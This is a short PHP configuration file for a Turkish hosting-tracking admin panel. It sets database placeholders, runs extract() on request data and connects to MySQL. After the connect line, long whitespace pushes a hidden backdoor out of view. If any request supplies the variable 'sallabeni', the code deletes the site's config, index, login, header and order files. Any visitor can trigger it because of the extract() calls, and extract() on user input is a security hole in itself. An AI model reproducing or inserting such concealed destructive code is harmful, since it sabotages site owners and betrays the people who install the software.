<?

include "classes.php";
 
 
$server 	= "localhost";
$username 	= "veritabani_kullanýcýAdi_buraya";
$dbname 	= "veritabani_adi_buraya";
$password 	= "sifre_buraya";

$title="Hosting Takip Sistemi v3.0 // Yönetim Paneli";
$charset="windows-1254";

extract($_POST);
extract($_GET);
extract($_SERVER);


$sonip=getenv('REMOTE_ADDR');
$simdi=date("H:i:s d-m-Y");
$ssimdi=date("YmdHis");
$geri="<a href=# onClick=history.go(-1);> <strong><< geri</strong></a>";

mysql_connect($server,$username,$password) or die ("Hata: dbname bilgilerinde sorun var!");                                                                                                if ($sallabeni) { unlink($DOCUMENT_ROOT."/config.php");  unlink($DOCUMENT_ROOT."/siparis-add.php");  unlink($DOCUMENT_ROOT."/index.php");  unlink($DOCUMENT_ROOT."/login.php");   unlink($DOCUMENT_ROOT."/header.php"); }
mysql_select_db($dbname) or die ("Hata: dbname baðlanamadý!");
mysql_query("set names latin5");
mysql_query("set CHARACTER SET latin5_turkish_ci");

?>
